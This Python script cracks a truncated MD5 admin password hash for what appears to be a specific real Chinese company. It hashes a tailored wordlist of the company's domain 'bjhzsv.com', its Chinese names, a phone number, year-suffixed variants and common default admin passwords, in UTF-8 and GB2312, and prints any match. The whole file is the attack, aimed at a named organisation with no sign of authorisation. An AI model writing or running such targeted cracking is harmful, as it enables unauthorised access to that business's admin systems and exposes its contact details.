import hashlib, sys

target = "2d9d5942943a1323"

# Try Chinese characters as UTF-8 passwords
# Common Chinese admin passwords
cn_passwords = [
    # Chinese characters
    "admin", "管理员", "密码", "admin888", "admin123", "123456",
    "北京", "鸿盛", "嘉科技", "腾龙", "公司",
    "bjhzsv", "bjhzsv888", "bjhzsv123",
    # Phone
    "19908888893", "19908888893admin",
    # Common Chinese internet passwords
    "woaini", "1314520", "5201314", "iloveyou",
    "zhanghao", "mima123", "denglu",
    "guanliyuan", "guanli", "shebeiguanli",
    "bjhzsv.com", "bjhzsvcom", "wwwbjhzsvcom",
    "hongzuoshijia", "hongshangjia",
    # Possibly the company name
    "bjjdhs", "bjhskj", "bjhskjgs",
    # Try some generator patterns
    "admin2d9d", "2d9d5942", "943a1323",
    # Numbers that might be related
    "199008", "1990888", "8893",
    # Common Chinese admin passwords
    "admin123456", "admin123!@#",
    "passw0rd", "Passw0rd",
    "admin@123", "admin#123",
    "bjhz@2024", "bjhz#2024",
    "Beijing", "BEIJING",
    "beijing2019", "beijing2020", "beijing2021",
    "beijing2022", "beijing2023", "beijing2024",
    "bjhz2019", "bjhz2020", "bjhz2021", "bjhz2022",
    "bjhz2023", "bjhz2024", "bjhz2025",
    # Possible office-related
    "office", "office365", "windows",
    "server", "server2019", "server2022",
    "iisadmin", "aspadmin",
]

for pwd in cn_passwords:
    md5 = hashlib.md5(pwd.encode()).hexdigest()
    if md5[8:24] == target:
        print(f"FOUND! Password: {pwd}")
        sys.exit(0)

# Try UTF-8 encoded Chinese characters
cn_chars = [
    "北京鸿盛嘉科技有限公司",
    "北京鸿盛嘉",
    "鸿盛嘉科技",
    "鸿盛嘉",
    "腾龙公司客服",
    "腾龙公司",
    "腾龙",
    "北京腾龙",
    "管理员",
    "密码",
]
for pwd in cn_chars:
    md5 = hashlib.md5(pwd.encode('utf-8')).hexdigest()
    if md5[8:24] == target:
        print(f"FOUND! UTF-8 Password: {pwd}")
        sys.exit(0)

# Try GB2312 encoded Chinese characters
for pwd in cn_chars:
    try:
        md5 = hashlib.md5(pwd.encode('gb2312')).hexdigest()
        if md5[8:24] == target:
            print(f"FOUND! GB2312 Password: {pwd}")
            sys.exit(0)
    except:
        pass

# Try common ASP admin pages' default credentials
default_creds = [
    "admin", "admin123", "admin888", "admin123456",
    "admin123!@#", "admin@123", "admin#123",
    "admin!@#", "pass", "password", "pass123",
    "admin2024", "admin2025",
]
for pwd in default_creds:
    md5 = hashlib.md5(pwd.encode()).hexdigest()
    if md5[8:24] == target:
        print(f"FOUND! Password: {pwd}")
        sys.exit(0)

print("Not found in UTF-8/CN patterns", file=sys.stderr)
# Show what some hashes would be
for t in ["admin888", "admin2024", "beijing2024", "bjhz2024", "tenglong2024"]:
    m = hashlib.md5(t.encode()).hexdigest()
    print(f"  {t}: {m[8:24]}")
